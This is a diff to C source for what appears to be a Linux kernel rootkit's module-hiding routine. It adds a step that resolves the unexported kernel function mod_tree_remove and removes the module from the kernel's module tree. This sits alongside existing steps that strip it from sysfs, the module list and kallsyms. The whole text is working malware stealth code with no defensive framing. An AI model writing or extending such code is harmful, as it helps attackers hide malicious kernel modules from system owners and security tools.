@@ -1,4 +1,5 @@
 #include "../include/hide_module.h"
+#include "../ftrace/ftrace_helper.h"
 
 #define MODULE_HIDE_DELAY_MS 200
 
@@ -37,6 +38,14 @@ static void __remove_from_module_list(struct module *mod)
     }
 }
 
+static void __remove_from_module_tree(struct module *mod)
+{
+    void (*mod_tree_remove)(struct module *mod) =
+        (void (*)(struct module *))resolve_sym("mod_tree_remove");
+    if (mod_tree_remove)
+        mod_tree_remove(mod);
+}
+
 static void __sanitize_module_info(struct module *mod)
 {
     mod->sect_attrs = NULL;
@@ -67,6 +76,7 @@ notrace void module_hide_current(void)
 
     __remove_from_sysfs(mod);
     __remove_from_module_list(mod);
+    __remove_from_module_tree(mod);
     __sanitize_module_info(mod);
     __remove_symbols_from_kallsyms(mod);
 
